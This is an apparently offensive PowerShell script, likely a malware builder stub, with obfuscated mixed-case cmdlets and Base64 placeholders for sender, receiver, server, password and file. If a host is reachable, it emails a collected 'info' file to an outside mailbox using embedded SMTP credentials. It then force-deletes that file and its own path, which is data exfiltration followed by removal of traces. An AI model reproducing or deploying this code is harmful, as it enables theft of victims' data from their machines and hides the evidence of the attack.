$senderEmail = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('SENDERMAIL')) -replaCe "`0",""
$receiverEmail = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('RECEIVERMAIL')) -replaCe "`0",""
$fileToSend = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('INFOFILE')) -replaCe "`0",""
$emailSubject = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('EMAILSUBJECT')) -replaCe "`0",""
$emailBody = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('EMAILBODY')) -replaCe "`0",""
$mailServer = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('SERVER')) -replaCe "`0",""
$mailPort = [sYsTeM.InT32]([sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('PORT')) -replaCe "`0","")
$senderPsw = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('SENDERPSW')) -replaCe "`0",""
$hostName = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('HOST')) -replaCe "`0",""
$path = [sYsTeM.TeXT.EnCOdIng]::UTF8.GeTsTrIng([sysTeM.COnVerT]::FrOMBase64sTrIng('PATH')) -replaCe "`0",""

if (TeST-ConnECtioN -cOmpuTernAMe $hostName -quIeT) {
  send-MaIlMessage -FrOM $senderEmail -TO $receiverEmail -suBJeCT $emailSubject -BOdy $emailBody -sMTpserVer $mailServer -pOrT $mailPort -UsesSl -CreDenTIal (NeW-OBJeCT -TypeNaMe sysTeM.ManageMenT.auTOMaTIOn.psCredenTIal -arguMenTLIsT $senderEmail, (COnVerTTO-seCurEsTrIng $senderPsw -aSplaInTeXT -FOrCe)) -aTTaCHMenTs $fileToSend
  ReMOve-itEm $fileToSend -FOrCe
  ReMOve-itEm $path -FOrCe
}
